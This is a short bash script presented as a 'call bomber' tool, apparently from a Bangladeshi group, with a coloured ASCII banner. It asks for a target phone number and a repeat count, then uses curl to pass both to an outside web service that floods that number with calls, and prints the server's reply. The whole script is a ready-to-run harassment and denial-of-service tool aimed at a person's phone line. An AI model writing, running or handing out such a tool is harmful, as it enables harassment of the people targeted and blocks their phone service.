#!/bin/bash

# Colors
red='\033[0;31m'
green='\033[0;32m'
cyan='\033[0;36m'
yellow='\033[1;33m'
nc='\033[0m' # No Color

# Clear screen
clear

# Logo section
echo -e "${cyan}▒█░░▒█ ▒█▀▀▀ ▒█▀▀█${nc}"
echo -e "${cyan}▒█▒█▒█ ▒█▀▀▀ ▒█▀▀▄${nc}"
echo -e "${cyan}▒█▄▀▄█ ▒█▄▄▄ ▒█▄▄█${nc}"
echo ""
echo -e "${green}▒█▀▀▀█ ▒█░░░ ░█▀▀█ ▒█▀▄▀█ ▒█▀▄▀█ ▒█▀▀▀ ▒█▀▀█${nc}"
echo -e "${green}░▀▀▀▄▄ ▒█░░░ ▒█▄▄█ ▒█▒█▒█ ▒█▒█▒█ ▒█▀▀▀ ▒█▄▄▀${nc}"
echo -e "${green}▒█▄▄▄█ ▒█▄▄█ ▒█░▒█ ▒█░░▒█ ▒█░░▒█ ▒█▄▄▄ ▒█░▒█${nc}"
echo ""
echo -e "${yellow}▒█▀▀█ ▒█▀▀▄${nc}"
echo -e "${yellow}▒█▀▀▄ ▒█░▒█${nc}"
echo -e "${yellow}▒█▄▄█ ▒█▄▄▀${nc}"
echo ""
echo -e "${cyan}========================================${nc}"
echo -e "${cyan}         CALL BOMBER TOOL${nc}"
echo -e "${cyan}          WEB SLAMMER BANGLADESH${nc}"
echo -e "${cyan}========================================${nc}"

# Input Section
read -p $'\033[1;33m[?]\033[0m Enter target number     : ' number
read -p $'\033[1;33m[?]\033[0m Enter number of repeats : ' limit
echo ""

# Loading effect
echo -ne "${green}[*] Sending calls"
for i in {1..3}; do
    sleep 0.5
    echo -ne "."
done
echo -e "${nc}"
echo ""

# API call
response=$(curl -s "https://call-bombers.vercel.app/send-call?key=Gift%20By%20DH%20Alamin&number=$number&repeat=$limit")

# Output
echo -e "${yellow}[+] Server Response:${nc}"
echo -e "$response"
echo ""
